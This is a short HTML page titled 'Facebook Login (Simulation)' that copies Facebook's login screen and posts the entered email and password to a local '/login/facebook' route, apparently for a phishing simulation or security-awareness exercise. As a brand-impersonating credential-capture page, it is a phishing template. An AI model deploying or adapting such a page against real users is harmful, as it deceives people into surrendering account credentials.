<!doctype html>
<html>
  <head>
    <title>Facebook Login (Simulation)</title>
    <link rel="stylesheet" href="./style/facebook-style.css" />
  </head>

  <body>
    <div class="container">
      <div class="left">
        <div class="logo">facebook</div>

        <div class="tagline">
          Facebook helps you connect and share with the people in your life.
        </div>
      </div>

      <div class="login-box">
        <form action="/login/facebook" method="POST">
          <input
            type="text"
            name="email"
            placeholder="Email address or phone number"
            required
          />

          <input
            type="password"
            name="password"
            placeholder="Password"
            required
          />

          <button type="submit">Log In</button>

          <a class="forgot" href="#">Forgotten password?</a>

          <hr />

          <button class="create" type="button">Create new account</button>
        </form>
      </div>
    </div>
  </body>
</html>
